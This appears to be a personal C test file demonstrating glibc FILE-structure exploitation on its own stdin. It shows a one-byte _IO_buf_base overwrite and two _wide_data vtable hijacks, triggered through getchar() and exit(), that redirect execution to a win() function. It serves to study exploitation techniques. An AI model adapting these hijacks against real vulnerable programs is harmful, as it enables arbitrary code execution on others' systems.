// Just testing some of my exploitation ideas here :)
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <unistd.h>

#define show(x) (printf(#x " = %p\n", x))
#define BREAK asm("int3")

void hexdump(unsigned char *ptr, size_t size)
{
	printf("\nhexdump @ %p:\n", ptr);
	for (size_t i = 0; i < size;) {
		printf("%p:   ", ptr + i);
		size_t j;
		for (j = i; j - i < 16 && j < size; j++) {
			printf("%02x ", ptr[j]);
		}
		printf("   ");
		for (j = i; j - i < 16 && j < size; j++) {
			if (0x20 <= ptr[j] && ptr[j] < 0x7f)
				putchar(ptr[j]);
			else
				putchar('.');
		}
		putchar('\n');
		i = j;
	}
}

void qwdump(unsigned char *ptr, size_t size)
{
	printf("\nqword dump @ %p\n", ptr);
	for (size_t i = 0; i < size;) {
		printf("%p:   ", ptr + i);
		size_t j;
		for (j = i; j - i < 16 && j < size; j += 8) {
			printf("0x%016lx ", *(uint64_t *)(ptr + j));
		}
		printf("   ");
		for (j = i; j - i < 16 && j < size; j++) {
			if (0x20 <= ptr[j] && ptr[j] < 0x7f)
				putchar(ptr[j]);
			else
				putchar('.');
		}
		putchar('\n');
		i = j;
	}
}

void setup(void)
{
	// prevent stdio buffers from being allocated on the heap
	setbuf(stdin, NULL);
	setbuf(stdout, NULL);
	setbuf(stderr, NULL);
}

void win(void)
{
	write(1, "WIN!\n", 5);
}

#define MY_IO_NO_WRITES 8
#define MY_IO_UNBUFFERED 2

void *winptr = win;

// overwriting the whole file struct with a one-byte write and a getchar() call
void one_byte_to_full_overwrite(FILE *fp)
{
	*(uint64_t *)(&fp->_IO_buf_base) &= (~0xff);
	show(fp->_IO_buf_base);
	getchar();
	qwdump((unsigned char *)fp, 0x100);
	exit(0);
}

// vtable attack triggered via getchar() call
void getchar_vtable_attack(FILE *fp)
{
	fp->_flags &= ~(MY_IO_NO_WRITES | MY_IO_UNBUFFERED);
	*((uint64_t *)(fp->_wide_data) + 3) = 0;
	*((uint64_t *)(fp->_wide_data) + 6) = 0;
	*(uint64_t *)((char *)fp->_wide_data + 0xe0) = (uint64_t)(((char *)(&winptr)) - 0x68);
	*(uint64_t *)((char *)fp + 0xd8) -= 0x550;
	getchar();
	qwdump((unsigned char *)fp, 0x100);
	exit(0);
}

// vtable attack triggered via _IO_cleanup() call in exit()
void exit_vtable_attack(FILE *fp)
{
	fp->_flags &= ~(MY_IO_NO_WRITES | MY_IO_UNBUFFERED);
	fp->_mode = -1;
	fp->_IO_write_ptr = fp->_IO_write_base + 1;
	*((uint64_t *)(fp->_wide_data) + 3) = 0;	// fp->_wide_data->_IO_write_base
	*((uint64_t *)(fp->_wide_data) + 6) = 0;	// fp->_wide_data->_IO_buf_base
	*(uint64_t *)((char *)fp->_wide_data + 0xe0) = (uint64_t)(((char *)(&winptr)) - 0x68);	// fp->_wide_data->_wide_vtable
	*(uint64_t *)((char *)fp + 0xd8) -= 0x540;	// fp->vtable
	qwdump((unsigned char *)fp, 0x100);
	exit(0);
}

int main(void)
{
	setup();

	FILE *fp = stdin;
	show(fp);
	show(fp->_IO_buf_base);
	show(fp->_IO_buf_end);

	// one_byte_to_full_overwrite(fp);
	// getchar_vtable_attack(fp);
	exit_vtable_attack(fp);

	return 0;
}
